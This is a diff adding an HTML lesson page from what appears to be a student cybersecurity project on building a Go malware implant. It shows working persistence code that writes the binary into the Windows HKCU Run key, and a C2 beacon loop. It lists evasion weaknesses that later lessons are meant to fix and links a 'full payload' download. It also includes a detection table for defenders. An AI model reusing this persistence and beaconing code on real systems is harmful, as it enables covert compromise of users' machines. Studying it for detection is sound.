+              <div class="info-card-val">os.WriteFile</div>
+            </div>
+            <div class="info-card">
+              <div class="info-card-label">Stage 6 — Beacon</div>
+              <div class="info-card-val">sendToC2()</div>
+            </div>
+            <div class="info-card">
+              <div class="info-card-label">Stage 7 — Sleep</div>
+              <div class="info-card-val">60 * time.Second</div>
+            </div>
+            <div class="info-card">
+              <div class="info-card-label">Stage 8 — Repeat</div>
+              <div class="info-card-val">→ back to stage 4</div>
+            </div>
+          </div>
+        </div>
+
+        <div>
+          <div class="section-label">key code — persistence</div>
+          <div class="code-wrap">
+            <div class="code-bar">
+              <span class="code-bar-filename">net_scan_v3.go</span>
+              <span class="code-bar-lang">Go</span>
+            </div>
+            <div class="code-scroll">
+<pre><span class="c-cm">// Get the binary's own path at runtime — works wherever it's deployed</span>
+exePath, _ := <span class="c-pkg">os</span>.<span class="c-fn">Executable</span>()
+
+<span class="c-cm">// Write path into HKCU Run key — executes on every user login</span>
+regPath := <span class="c-str">`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`</span>
+persistCmd := <span class="c-pkg">fmt</span>.<span class="c-fn">Sprintf</span>(
+    <span class="c-str">`reg add "%s" /v ReconBeacon /t REG_SZ /d "%s" /f`</span>,
+    regPath, exePath)
+<span class="c-pkg">exec</span>.<span class="c-fn">Command</span>(<span class="c-str">"cmd"</span>, <span class="c-str">"/C"</span>, persistCmd).<span class="c-fn">Run</span>()
+
+<span class="c-cm">// HKCU = no admin required. Trade-off: only persists for current user.</span>
+<span class="c-cm">// "ReconBeacon" value name is a hardcoded IoC — see obfuscation lessons.</span></pre>
+            </div>
+          </div>
+        </div>
+
+        <div>
+          <div class="section-label">key code — beacon loop</div>
+          <div class="code-wrap">
+            <div class="code-bar">
+              <span class="code-bar-filename">net_scan_v3.go</span>
+              <span class="code-bar-lang">Go</span>
+            </div>
+            <div class="code-scroll">
+<pre><span class="c-kw">for</span> {  <span class="c-cm">// infinite loop — no condition, runs until process is killed</span>
+    timestamp := <span class="c-pkg">time</span>.<span class="c-fn">Now</span>().<span class="c-fn">Format</span>(<span class="c-str">"2006-01-02 15:04:05"</span>)
+
+    <span class="c-cm">// ... all recon commands run each cycle ...</span>
+
+    <span class="c-fn">sendToC2</span>(c2URL, path, hostname)
+
+    <span class="c-cm">// Fixed 60s sleep — detectable as a beacon pattern by network IDS.</span>
+    <span class="c-cm">// Jitter (±20%) is added in the obfuscation phase.</span>
+    <span class="c-pkg">time</span>.<span class="c-fn">Sleep</span>(<span class="c-num">60</span> * <span class="c-pkg">time</span>.Second)
+}</pre>
+            </div>
+          </div>
+        </div>
+
+        <div class="callout danger">
+          <strong>OPSEC weaknesses in v3 (addressed in obfuscation lessons):</strong><br>
+          (1) C2 URL hardcoded in plaintext — visible with strings.exe<br>
+          (2) "ReconBeacon" registry value name is a static IoC<br>
+          (3) Fixed 60s beacon interval is a detectable network pattern<br>
+          (4) Debug symbols in binary expose function names in Ghidra/Binary Ninja
+        </div>
+
+        <div>
+          <div class="section-label">detection surface</div>
+          <table class="detect-table">
+            <thead><tr><th>Method</th><th>Signal</th><th>Noise level</th></tr></thead>
+            <tbody>
+              <tr><td class="evt">Sysmon EID 13</td><td>Registry write to HKCU\...\Run — extremely common detection rule</td><td class="high">Very High</td></tr>
+              <tr><td class="evt">Autoruns.exe</td><td>"ReconBeacon" value under HKCU Run — highlighted as unknown/unsigned binary</td><td class="high">Very High</td></tr>
+              <tr><td class="evt">Network IDS (Zeek)</td><td>Periodic beacon: same dst IP, port 5000, ~60s fixed interval</td><td class="high">High</td></tr>
+              <tr><td class="evt">Sysmon EID 3</td><td>Outbound connection to 192.168.x.x:5000 every cycle</td><td class="med">Medium</td></tr>
+              <tr><td class="evt">Sysmon EID 1</td><td>6+ cmd.exe children spawned in rapid succession</td><td class="high">High</td></tr>
+              <tr><td class="evt">EDR process tree</td><td>payload.exe → cmd.exe → [systeminfo, netstat, tasklist...] parent anomaly</td><td class="high">High</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <div>
+          <div class="section-label">downloads</div>
+          <div class="download-row">
+            <a href="{{ url_for('static', filename='downloads/net_scan_v3.go') }}" download class="dl-card">
+              <div class="dl-icon dl-icon-go">🐹</div>
+              <div class="dl-info">
+                <div class="dl-filename">net_scan_v3.go</div>
+                <div class="dl-meta">Go source · v3 · full payload</div>
+              </div>
+              <span class="dl-arrow">↓</span>
+            </a>
+            <a href="{{ url_for('static', filename='downloads/Lesson_03_net_scan_v3.docx') }}" download class="dl-card">
+              <div class="dl-icon dl-icon-docx">📄</div>
+              <div class="dl-info">
+                <div class="dl-filename">Lesson_03_net_scan_v3.docx</div>
+                <div class="dl-meta">Word doc · OPSEC analysis + exercises</div>
+              </div>
+              <span class="dl-arrow">↓</span>
+            </a>
+          </div>
+        </div>
+
+      </div>
+    </section>
+
+  </main>
+</div>
+
+<footer>
+  Final Year Cybersecurity Project &nbsp;·&nbsp; Educational use only &nbsp;·&nbsp; Lab environment
+</footer>
+
+<script>
+  // Sticky sidebar active link on scroll
+  const sections = document.querySelectorAll('.version-section, #overview');
+  const links = document.querySelectorAll('.sidebar-nav a');
+  const observer = new IntersectionObserver(entries => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        links.forEach(l => l.classList.remove('active'));
+        const id = e.target.id;
+        const active = document.querySelector(`.sidebar-nav a[href="#${id}"]`);
+        if (active) active.classList.add('active');
+      }
+    });
+  }, { rootMargin: '-40% 0px -55% 0px' });
+  sections.forEach(s => observer.observe(s));
+</script>
+
+</body>
+</html>
